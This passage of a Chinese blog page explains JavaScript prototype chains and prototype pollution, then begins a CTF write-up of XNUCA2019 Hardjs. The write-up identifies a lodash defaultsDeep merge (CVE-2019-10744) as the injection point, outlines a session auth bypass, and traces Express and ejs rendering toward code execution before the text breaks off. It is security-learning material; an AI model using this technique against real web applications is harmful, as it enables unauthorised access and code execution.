valueOf()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果属性不存在 <code>doSomeInstancing</code> 的 <code>__proto__</code> 的  <code>__proto__</code> 中， 那么就会在<code>doSomeInstancing</code> 的 <code>__proto__</code> 的  <code>__proto__</code> 的  <code>__proto__</code> 中查找。然而, 这里存在个问题：<code>doSomeInstancing</code> 的 <code>__proto__</code> 的  <code>__proto__</code> 的  <code>__proto__</code> 其实不存在。因此，只有这样，在 <code>__proto__</code> 的整个原型链被查看之后，这里没有更多的 <code>__proto__</code> ， 浏览器断言该属性不存在，并给出属性值为 <code>undefined</code> 的结论。</p>
+<h3 id="创建对象和生成原型链"><a href="#创建对象和生成原型链" class="headerlink" title="创建对象和生成原型链"></a>创建对象和生成原型链</h3><p>使用语法结构创建对象: </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;<span class="attr">a</span>: <span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// o 这个对象继承了 Object.prototype 上面的所有属性</span></span><br><span class="line"><span class="comment">// o 自身没有名为 hasOwnProperty 的属性</span></span><br><span class="line"><span class="comment">// hasOwnProperty 是 Object.prototype 的属性</span></span><br><span class="line"><span class="comment">// 因此 o 继承了 Object.prototype 的 hasOwnProperty</span></span><br><span class="line"><span class="comment">// Object.prototype 的原型为 null</span></span><br><span class="line"><span class="comment">// 原型链如下:</span></span><br><span class="line"><span class="comment">// o ---&gt; Object.prototype ---&gt; null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = [<span class="string">&quot;yo&quot;</span>, <span class="string">&quot;whadup&quot;</span>, <span class="string">&quot;?&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组都继承于 Array.prototype </span></span><br><span class="line"><span class="comment">// (Array.prototype 中包含 indexOf, forEach 等方法)</span></span><br><span class="line"><span class="comment">// 原型链如下:</span></span><br><span class="line"><span class="comment">// a ---&gt; Array.prototype ---&gt; Object.prototype ---&gt; null</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数都继承于 Function.prototype</span></span><br><span class="line"><span class="comment">// (Function.prototype 中包含 call, bind等方法)</span></span><br><span class="line"><span class="comment">// 原型链如下:</span></span><br><span class="line"><span class="comment">// f ---&gt; Function.prototype ---&gt; Object.prototype ---&gt; null</span></span><br></pre></td></tr></table></figure>
+
+<p>使用构造器创建对象: </p>
+<p>在 JavaScript 中，构造器其实就是一个普通的函数。当使用 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/new">new 操作符</a> 来作用这个函数时，它就可以被称为构造方法（构造函数）。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Graph</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.vertices = [];</span><br><span class="line">  <span class="built_in">this</span>.edges = [];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Graph.prototype = &#123;</span><br><span class="line">  addVertex: <span class="function"><span class="keyword">function</span>(<span class="params">v</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.vertices.push(v);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> g = <span class="keyword">new</span> Graph();</span><br><span class="line"><span class="comment">// g 是生成的对象，他的自身属性有 &#x27;vertices&#x27; 和 &#x27;edges&#x27;。</span></span><br><span class="line"><span class="comment">// 在 g 被实例化时，g.[[Prototype]] 指向了 Graph.prototype</span></span><br></pre></td></tr></table></figure>
+
+<p>使用<code>Object.create</code>创建对象</p>
+<p>ECMAScript 5 中引入了一个新方法：<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/create"><code>Object.create()</code></a>。可以调用这个方法来创建一个新对象。新对象的原型就是调用 create 方法时传入的第一个参数：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;<span class="attr">a</span>: <span class="number">1</span>&#125;; </span><br><span class="line"><span class="comment">// a ---&gt; Object.prototype ---&gt; null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b = <span class="built_in">Object</span>.create(a);</span><br><span class="line"><span class="comment">// b ---&gt; a ---&gt; Object.prototype ---&gt; null</span></span><br><span class="line"><span class="built_in">console</span>.log(b.a); <span class="comment">// 1 (继承而来)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> c = <span class="built_in">Object</span>.create(b);</span><br><span class="line"><span class="comment">// c ---&gt; b ---&gt; a ---&gt; Object.prototype ---&gt; null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> d = <span class="built_in">Object</span>.create(<span class="literal">null</span>);</span><br><span class="line"><span class="comment">// d ---&gt; null</span></span><br><span class="line"><span class="built_in">console</span>.log(d.hasOwnProperty); <span class="comment">// undefined, 因为d没有继承Object.prototype</span></span><br></pre></td></tr></table></figure>
+
+<p>使用<code>class</code> 关键字创建对象: </p>
+<p>ECMAScript6 引入了一套新的关键字用来实现 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Classes">class</a>。使用基于类语言的开发人员会对这些结构感到熟悉，但它们是不同的。JavaScript 仍然基于原型。这些新的关键字包括 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/class"><code>class</code></a>, <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Classes/constructor"><code>constructor</code></a>，<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Classes/static"><code>static</code></a>，<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Classes/extends"><code>extends</code></a> 和 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/super"><code>super</code></a>。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Polygon</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(height, width) &#123;</span><br><span class="line">    <span class="built_in">this</span>.height = height;</span><br><span class="line">    <span class="built_in">this</span>.width = width;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Square</span> <span class="keyword">extends</span> <span class="title">Polygon</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(sideLength) &#123;</span><br><span class="line">    <span class="built_in">super</span>(sideLength, sideLength);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">get</span> <span class="title">area</span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.height * <span class="built_in">this</span>.width;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">set</span> <span class="title">sideLength</span>(<span class="params">newLength</span>) &#123;</span><br><span class="line">    <span class="built_in">this</span>.height = newLength;</span><br><span class="line">    <span class="built_in">this</span>.width = newLength;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> square = <span class="keyword">new</span> Square(<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
+
+<p><code>hasOwnProperty</code> 是 JavaScript 中唯一一个处理属性并且<strong>不会</strong>遍历原型链的方法。</p>
+<hr>
+<p>下面根据Smi1e 师傅的文章来过一遍基础知识</p>
+<p>注: 参考资料2</p>
+<p>JavaScript 是一门面向对象的语言，但是在 ES6 之前，JavaScript 中没有 class 语法。不过在它的构造函数（<code>constructor</code>）就相当于类，通过构造函数，我们可以生成实例化的对象。</p>
+<p>看下面的代码示例即可: </p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415112310.png"></p>
+<p>从最后的代码可以知道: </p>
+<blockquote>
+<p><strong>实例对象的 <code>__proto__</code>与创建该实例对象的构造函数的 <code>prototype</code> 是相等的。</strong></p>
+</blockquote>
+<p>图来自参考资料2: </p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415112511.png"></p>
+<p>每个原型对象都有一个 <strong>constructor 属性，指向相关联的构造函数</strong>，所以构造函数和构造函数的 prototype 是可以相互指向的。实例对象也可以访问constructor 属性指向其构造函数。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415112825.png"></p>
+<p>原型链: 在JavaScript 中, 如果访问某个属性,首先会在实例对象的内部寻找, 如果没找到, 就在该对象的原型<code>cat.__proto__</code> 即 <code>Cat.prototype</code> 上找, 对象的原型也是对象, 也有原型, 如果在对象的原型上也没有找到目标属性,则会在对象的原型的原型<code>Cat.prototype.__proto__</code> 上寻找, 依次内推, <strong>直到找到了这个属性或者到达了最顶层.</strong></p>
+<p>实例对象原型的原型是<code>Object.prototype</code>，而它的原型是null，null 没有原型，所以 <code>Object.prototype</code> 就是原型链的最顶端。</p>
+<p>在原型上一层一层找, 这就是原型链.</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415113203.png"></p>
+<h1 id="0x01-原型链污染攻击"><a href="#0x01-原型链污染攻击" class="headerlink" title="0x01 原型链污染攻击"></a>0x01 原型链污染攻击</h1><p>终于我们来到了笔记的正文✖, 其实基础知识更重要 ✔</p>
+<p>在JavaScript中访问一个对象的属性可以用<code>a.b.c</code>或者<code>a[&quot;b&quot;][&quot;c&quot;]</code>来访问。由于对象是无序的,当使用第二种方式访问对象时,只能使用指明下标的方式去访问。因此我们可以通过<code>a[&quot;__proto__&quot;]</code>的方式去访问其原型对象。</p>
+<p>在Javascript中可以通过<code>example.a.b</code>或<code>example.a[&quot;b&quot;]</code>来对数组进行访问,<code>example.a</code>访问的是<code>example</code>对象下的<code>a</code>对象的<code>b</code>,而<code>example.a[&quot;b&quot;]</code>则是访问<code>example</code>对象下的<code>a</code>数组的下标为<code>b</code>的值。</p>
+<p>由于对象是无序的,当使用第二种方式访问对象时,只能使用指明下标的方式去访问。</p>
+<p>因此我们可以通过<code>a[&quot;__proto__&quot;]</code>的方式去访问其原型对象。</p>
+<p><strong>在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染。</strong></p>
+<h1 id="0x02-Hacking-in-CTF"><a href="#0x02-Hacking-in-CTF" class="headerlink" title="0x02    Hacking in CTF"></a>0x02    Hacking in CTF</h1><p>前面说了那么多基础知识, 重要的还是实际操作, <strong>know it then hack it !</strong></p>
+<h2 id="XNUCA2019-Hardjs"><a href="#XNUCA2019-Hardjs" class="headerlink" title="XNUCA2019 Hardjs"></a>XNUCA2019 Hardjs</h2><ul>
+<li><p>原型链污染到RCE(太难了…复现的过程很吃力…找不到简单的题呀!)</p>
+</li>
+<li><p>此题前后端都存在原型链污染漏洞</p>
+</li>
+<li><p>有多种Hacking 方式, 这里我选择先知上的那种方法来进行复现… 另外的方法都有能力了再说</p>
+<ul>
+<li>CVE-2019-11358 jQuery 原型链污染漏洞 <a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/201762.html">https://www.freebuf.com/vuls/201762.html</a> jQuery jQuery 3.4 Drupal Drupal 8.6.15 Drupal Drupal 8.5.15 Drupal Drupal  7.66 Backdrop Backdrop 1.12.6 Backdrop Backdrop 1.11.9                             </li>
+<li>CVE-2019-10744 Lodash 库原型链污染漏洞 <a target="_blank" rel="noopener" href="https://www.venustech.com.cn/article/1/9577.html">https://www.venustech.com.cn/article/1/9577.html</a> 影响范围：  4.17.11之前的所有版本</li>
+</ul>
+</li>
+</ul>
+<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>题目页面长这样, 是一个登陆界面,注册一个admin账号,显示用户名重复, <del>那么很明显应该是要伪造身份成为admin的样了</del></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415135304.png"></p>
+<p>进去之后是这样</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415135849.png"></p>
+<p>打开网络测试不同的功能点,当我发表内容时,发出的请求, 是JSON格式的 , 既然是js漏洞问题, 那么就看看js文件</p>
+<p>这题在buu上只有 这几个js文件, 几个重要的js文件在GitHub上看吧. 原来这道题是给了附件的, 那么就把源码下下来吧</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415145752.png"></p>
+<p>目录中<code>server.js</code> 和<code>robot.py</code> 估计是重点审计对象, 干就完了</p>
+<p>在<code>robot.py</code> 中, 如图所示, flag 是被定义在了环境变量中并且是admin的密码, <del>如果以admin的账号登录,那么就可能得到flag, 现在就是如何去找到漏洞点, 进行身份伪造</del></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415155932.png"></p>
+<p>实在是没啥具体思路, 只有隐隐约约那么一点儿味道. 还是看wp复现吧.TTTTTTTCCCCCCL</p>
+<p>在<code>server.js</code> 中可以看到路由: </p>
+<ul>
+<li>/ 主页</li>
+<li>/static 静态文件</li>
+<li>/sandbox 展示用户HTML 数据用的沙盒</li>
+<li>/login 登陆</li>
+<li>/register 注册</li>
+<li>/get json 接口 获取数据库中保存的数据</li>
+<li>/add 用户添加数据的借口</li>
+</ul>
+<p>除了<code>/static</code>，<code>/login</code>和<code>/register</code>以外，所以路由在访问的时候都会经过一个<code>auth</code>函数进行身份验证</p>
+<p>因为做了转义处理，所以应该是没有Sql注入的问题，需要从其他方面下手</p>
+<p>从初始化的地方我们可以得到如下信息: </p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415165256.png"></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.use(bodyParser.urlencoded(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;)).use(bodyParser.json())</span><br></pre></td></tr></table></figure>
+
+<p>这里允许了我们通过JSON格式向服务器传递参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.set(&#39;json escape&#39;,true)</span><br><span class="line">app.set(&#39;views&#39;, &#39;.&#x2F;views&#39;)</span><br><span class="line">app.set(&#39;view engine&#39;, &#39;ejs&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>视图是通过<code>ejs</code> 模板渲染的</p>
+<p>这个服务器是<code>Node.js</code> 采用了<code>express</code> 框架….  有点慌了是不是</p>
+<h3 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h3><p>在<code>server.js</code>  的<code>/get</code> 路由中: </p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415171558.png"></p>
+<p>当查询的结果超过五条, 那么就会<code>merge</code> 合并成为1条, 具体的过程就是从mysql中一条一条的查询当前用户的所有数据, 然后一条一条的合并</p>
+<p>其中的</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;raws.length ;i++)&#123;</span><br><span class="line">     lodash.defaultsDeep(doms,<span class="built_in">JSON</span>.parse( raws[i].dom ));</span><br></pre></td></tr></table></figure>
+
+<p>正好是<code>lodash</code> 库的一个原型链漏洞的攻击对象</p>
+<blockquote>
+<p>通过构造函数重载的方式，Lodash 库中的函数 defaultsDeep 很有可能会被欺骗添加或修改 Object.prototype 的属性，最终可能导致 Web 应用程序崩溃或改变其行为，具体取决于受影响的用例。</p>
+</blockquote>
+<p>参考的师傅说 查看了版本刚好是<code>4.17.11</code> 我不知道他是怎么看的… ✖</p>
+<p>在<code>package.json</code> 中可以看到这些配置的版本信息 ✔</p>
+<hr>
+<p>既然要伪造admin的身份, 那么就应该把眼光放在session cookie 以及 认证的代码上.</p>
+<p>在<code>server.js</code> 中, <code>auth</code> 函数</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// var session = req.session;</span></span><br><span class="line">    <span class="keyword">if</span>(!req.session.login || !req.session.userid )&#123;</span><br><span class="line">        res.redirect(<span class="number">302</span>,<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        next();</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里我们知道, 在没有登陆的时候, 是不存在session的, 也就是说 <code>req.session.login</code> 以及 <code>req.session.userid</code>  是 undefinded </p>
+<p>而session 对象的父类肯定包含了<code>Object</code> , 故我们只需要修改Object 中的这部分代码就可以绕过登录, 以admin的身份访问页面(利用原型链污染)</p>
+<p>审计<code>server.js</code> 可以知道, 所有的结果都是通过<code>res.render</code> 来进行渲染的, <strong>那么尝试从这里入手, 跟进模板渲染的过程来寻找符合上面条件的利用点</strong></p>
+<p>通过跟进<code>/login</code> 的<code>res.render</code>  , 我这里没办法跟进啊??!</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415180136.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200303222123.jpg"></p>
+<p>为了复现过程的完整性, 那么就看着wp继续走下去吧, 下面的内容直接CTRL C/V</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">res.render = <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">view, options, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> app = <span class="built_in">this</span>.req.app;</span><br><span class="line">  <span class="keyword">var</span> done = callback;</span><br><span class="line">  <span class="keyword">var</span> opts = options || &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> req = <span class="built_in">this</span>.req;</span><br><span class="line">  <span class="keyword">var</span> self = <span class="built_in">this</span>;</span><br><span class="line"></span><br><span class="line">  ....</span><br><span class="line"></span><br><span class="line">  <span class="comment">// render</span></span><br><span class="line">  app.render(view, opts, done);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>可以发现来到了<code>response.js</code>的中对<code>res.render</code>的定义，并且调用了<code>app.render</code>，同时，将进行了参数配置传递。继续跟进，来到<code>application.js</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">app.render = <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">name, options, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> cache = <span class="built_in">this</span>.cache;</span><br><span class="line">  <span class="keyword">var</span> done = callback;</span><br><span class="line">  <span class="keyword">var</span> engines = <span class="built_in">this</span>.engines;</span><br><span class="line">  <span class="keyword">var</span> opts = options;</span><br><span class="line">  <span class="keyword">var</span> renderOptions = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> view;</span><br><span class="line">  ....</span><br><span class="line">  <span class="comment">// render</span></span><br><span class="line">  tryRender(view, renderOptions, done);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>发现调用了<code>tryRender</code>，并继续传递配置，我们继续跟进</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tryRender</span>(<span class="params">view, options, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    view.render(options, callback);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    callback(err);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用了<code>view.render</code>，继续跟进就来到了<code>view.js</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">View.prototype.render = <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">options, callback</span>) </span>&#123;</span><br><span class="line">  debug(<span class="string">&#x27;render &quot;%s&quot;&#x27;</span>, <span class="built_in">this</span>.path);</span><br><span class="line">  <span class="built_in">this</span>.engine(<span class="built_in">this</span>.path, options, callback);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>调用了<code>engine</code>，终于来到了模板渲染引擎<code>ejs.js</code>中。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.renderFile = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> args = <span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>);</span><br><span class="line">  <span class="keyword">var</span> filename = args.shift();</span><br><span class="line">  <span class="keyword">var</span> cb;</span><br><span class="line">  <span class="keyword">var</span> opts = &#123;<span class="attr">filename</span>: filename&#125;;</span><br><span class="line">  <span class="keyword">var</span> data;</span><br><span class="line">  <span class="keyword">var</span> viewOpts;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> tryHandleCache(opts, data, cb);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>发现跳到<code>renderFile</code>函数，并且又调用了<code>tryHandleCache</code>，我这里省略了opts传递的代码</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tryHandleCache</span>(<span class="params">options, data, cb</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> result;</span><br><span class="line">  ...</span><br><span class="line">      result = handleCache(options)(data);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里可以看到<code>handleCache</code>返回了一个函数，并且将data传入进行执行，而这个result就是最后生成的页面了，这个时候可以感觉到，有RCE的可能性。继续跟进。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleCache</span>(<span class="params">options, template</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> func;</span><br><span class="line">  <span class="keyword">var</span> filename = options.filename;</span><br><span class="line">  <span class="keyword">var</span> hasTemplate = <span class="built_in">arguments</span>.length &gt; <span class="number">1</span>;</span><br><span class="line">  ...</span><br><span class="line">  func = <span class="built_in">exports</span>.compile(template, options);</span><br><span class="line">  <span class="keyword">if</span> (options.cache) &#123;</span><br><span class="line">    <span class="built_in">exports</span>.cache.set(filename, func);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> func;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进生成func的<code>compile</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.compile = <span class="function"><span class="keyword">function</span> <span class="title">compile</span>(<span class="params">template, opts</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> templ;</span><br><span class="line">  ...</span><br><span class="line">  templ = <span class="keyword">new</span> Template(template, opts);</span><br><span class="line">  <span class="keyword">return</span> templ.compile();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>发现新建了一个Template对象并执行其成员方法得到返回的func。我们跟进其成员方法<code>compile</code>查看</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">compile: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> src;</span><br><span class="line">    <span class="keyword">var</span> fn;</span><br><span class="line">    <span class="keyword">var</span> opts = <span class="built_in">this</span>.opts;</span><br><span class="line">    <span class="keyword">var</span> prepended = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> appended = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span 